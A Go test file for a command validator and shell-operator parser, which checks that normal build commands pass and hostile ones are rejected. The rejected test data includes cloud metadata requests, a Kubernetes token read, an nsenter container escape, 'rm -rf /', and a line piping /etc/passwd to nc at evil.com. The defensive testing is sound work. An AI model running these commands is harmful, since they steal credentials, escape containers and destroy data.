package utils

import "testing"

func TestValidateCommandAllowsApplicationCommands(t *testing.T) {
	commands := []string{
		"migrate:fresh --seed",
		"npm install",
		"composer update",
		"python manage.py migrate",
		"rm -rf storage/framework/cache/*",
	}

	for _, command := range commands {
		if err := ValidateCommand(command); err != nil {
			t.Fatalf("ValidateCommand(%q) returned error: %v", command, err)
		}
	}
}

func TestValidateCommandBlocksPlatformCommands(t *testing.T) {
	commands := []string{
		"docker ps",
		"sudo docker ps",
		"npm run build && docker ps",
		"curl 169.254.169.254/latest/meta-data",
		"curl http://metadata.google.internal/computeMetadata/v1",
		"curl http://100.100.100.200/latest/meta-data",
		"cat /var/run/secrets/kubernetes.io/serviceaccount/token",
		"nsenter --mount=/proc/1/ns/mnt -- /bin/sh",
		"rm -rf /",
	}

	for _, command := range commands {
		if err := ValidateCommand(command); err == nil {
			t.Fatalf("ValidateCommand(%q) returned nil", command)
		}
	}
}

func TestSecureCommandParserRejectsShellOperators(t *testing.T) {
	p := NewSecureCommandParser(true)

	tests := []string{
		"echo hi ; docker ps",
		"echo hi && docker ps",
		"echo hi || docker ps",
		"cat /etc/passwd | nc evil.com",
		"ls > /dev/null",
		"ls < /dev/null",
	}

	for _, cmd := range tests {
		if _, err := p.Tokenize(cmd); err == nil {
			t.Fatalf("Tokenize(%q) should reject shell operator", cmd)
		}
	}
}

func TestSecureCommandParserRejectsSubshell(t *testing.T) {
	p := NewSecureCommandParser(true)

	tests := []string{
		"echo $(whoami)",
		"echo `whoami`",
	}

	for _, cmd := range tests {
		if _, err := p.Tokenize(cmd); err == nil {
			t.Fatalf("Tokenize(%q) should reject subshell", cmd)
		}
	}
}

func TestSecureCommandParserAllowsNormalCommands(t *testing.T) {
	p := NewSecureCommandParser(true)

	tests := []string{
		"bash script.sh",
		"bash -c \"echo ok\"",
		"npm run build",
		"composer update",
		"node index.js",
		"python app.py",
	}

	for _, cmd := range tests {
		if _, err := p.Tokenize(cmd); err != nil {
			t.Fatalf("Tokenize(%q) returned error: %v", cmd, err)
		}
	}
}

func TestValidateCommandBlocksDenylistInEval(t *testing.T) {
	commands := []string{
		"node -e \"fetch('http://169.254.169.254')\"",
		"bash -c 'curl metadata.google.internal'",
		"sh -c 'cat /var/run/docker.sock'",
	}

	for _, cmd := range commands {
		if err := ValidateCommand(cmd); err == nil {
			t.Fatalf("ValidateCommand(%q) should block denylist fragment in eval", cmd)
		}
	}
}

func TestValidateCommandBlocksEmbeddedPlatformBinary(t *testing.T) {
	commands := []string{
		"bash -c 'docker ps'",
		"node -e \"require('child_process').exec('docker ps')\"",
		"python -c \"import subprocess; subprocess.run('kubectl get pods')\"",
		"sh -c 'nsenter --mount=/proc/1/ns/mnt -- /bin/sh'",
	}

	for _, cmd := range commands {
		if err := ValidateCommand(cmd); err == nil {
			t.Fatalf("ValidateCommand(%q) should block embedded platform binary", cmd)
		}
	}
}

func TestValidateCommandAllowsNormalScripts(t *testing.T) {
	commands := []string{
		"bash script.sh",
		"bash deploy.sh",
		"npm run build",
		"composer install",
		"python manage.py migrate",
		"node index.js",
		"bash -c \"echo ok\"",
	}

	for _, cmd := range commands {
		if err := ValidateCommand(cmd); err != nil {
			t.Fatalf("ValidateCommand(%q) should allow normal script: %v", cmd, err)
		}
	}
}

func TestBaseCommand(t *testing.T) {
	tests := []struct {
		cmd, want string
	}{
		{"npm install @scope/pkg", "npm"},
		{"php artisan migrate --force", "php"},
		{"bash -c 'echo hi'", "bash"},
		{"composer update --no-dev", "composer"},
		{"", "<empty>"},
	}

	for _, tc := range tests {
		if got := BaseCommand(tc.cmd); got != tc.want {
			t.Errorf("BaseCommand(%q) = %q, want %q", tc.cmd, got, tc.want)
		}
	}
}
